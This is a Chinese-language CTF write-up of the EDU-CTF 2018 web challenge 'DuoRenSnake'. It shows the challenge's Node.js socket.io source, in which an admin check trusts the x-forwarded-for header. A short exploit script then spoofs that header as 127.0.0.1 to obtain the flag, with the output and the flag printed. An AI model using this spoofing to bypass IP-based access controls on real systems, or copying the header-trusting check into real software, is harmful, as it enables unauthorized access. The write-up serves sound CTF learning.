---
uuid: 466363de
title: EDU-CTF 2018 - DuoRenSnake
tags:
  - writeup 
  - web
categories:
  - Capture The Flag
  - EDU-CTF 2018
date: 2019-02-01 00:00:00
updated: 2019-02-01 00:00:00
---

開場 10 分鍾內可以解掉的水題，網站點進去是一個簡單的貪食蛇小遊戲，觀察後發現可以透過偽造 http header 來 pass check

<!--more-->

# [正文]
題目有給 source code

{% codeblock source code lang:js line_number:true %}
"use strict";

const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const _ = require('lodash');

const Snake = require('./snake');
const Apple = require('./apple');
var ipaddr = require('ipaddr.js');

let autoId = 0;
const GRID_SIZE = 40;
let players = [];
let apples = [];

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});

http.listen(3000, () => {
  console.log('listening on *:3000');
});

io.on('connection', (client) => {
  let player;
  let id;

  client.on('auth', (opts, cb) => {
    // Create player
    id = ++autoId;
    player = new Snake(_.assign({
      id,
      dir: 'right',
      gridSize: GRID_SIZE,
      snakes: players,
      apples
    }, opts));
    players.push(player);
    cb({ id: autoId });
  });

  client.on('key', (key) => {
    if(player) {
      player.changeDirection(key);
    }
  });

  client.on('disconnect', () => {
    _.remove(players, player);
  });

  client.on('admin', (msg, cb) => {
    var ipString = client.handshake.headers['x-forwarded-for'] || client.request.connection.remoteAddress;
    if (ipaddr.IPv4.isValid(ipString)) {

    } else if (ipaddr.IPv6.isValid(ipString)) {
      var ip = ipaddr.IPv6.parse(ipString);
      if (ip.isIPv4MappedAddress()) {
        ipString = ip.toIPv4Address().toString();
      } else {
        // ipString is IPv6
      }
    } else {
      // ipString is invalid
    }

    console.log(ipString);
    if(ipString == "127.0.0.1") {
      cb("FLAG{xxxxxxxxxx}");
    }
  });

});

for(var i=0; i < 3; i++) {
  apples.push(new Apple({
    gridSize: GRID_SIZE,
    snakes: players,
    apples
  }));
}


setInterval(() => {
  players.forEach((p) => {
    p.move();
  });
  io.emit('state', {
    players: players.map((p) => ({
      x: p.x,
      y: p.y ,
      id: p.id,
      nickname: p.nickname,
      points: p.points,
      tail: p.tail
    })),
    apples: apples.map((a) => ({
      x: a.x,
      y: a.y
    }))
  });
}, 100);
{% endcodeblock %}

## Analysis 
1. 觀察 source code，不難發現在 socket admin 下，ip check 可以透過偽造 x-forwarded-for 來 pass，然後就會直接噴 flag 了。
  {% codeblock lang:js first_line:53 %}
  client.on('admin', (msg, cb) => {
    var ipString = client.handshake.headers['x-forwarded-for'] || client.request.connection.remoteAddress;
    if (ipaddr.IPv4.isValid(ipString)) {

    } else if (ipaddr.IPv6.isValid(ipString)) {
    var ip = ipaddr.IPv6.parse(ipString);
    if (ip.isIPv4MappedAddress()) {
        ipString = ip.toIPv4Address().toString();
    } else {
        // ipString is IPv6
    }
    } else {
    // ipString is invalid
    }

    console.log(ipString);
    if(ipString == "127.0.0.1") {
    cb("FLAG{xxxxxxxxxx}");
    }
  });
  {% endcodeblock %}

## Payload

{% codeblock package.json lang:json %}
{
    "name": "payload",
    "version": "0.0.0",
    "dependencies": {
        "socket.io-client": "^2.2.0"
    },
    "license": "MIT"
}
{% endcodeblock %}

{% codeblock payload.js lang:js line_number:true %}
"use strict";

const io = require('socket.io-client')
const socket = io.connect('http://final.kaibro.tw:10001', {
    extraHeaders: { 'x-forwarded-for': "127.0.0.1" }
});

socket.emit( 'admin', 'm', m => console.log(m) );
{% endcodeblock %}

{% codeblock lang:shell line_number:false %}
$ node payload.js
FLAG{G3t_R3al_IP_1s_50_h4rd}
{% endcodeblock %}

FLAG: `FLAG{G3t_R3al_IP_1s_50_h4rd}`
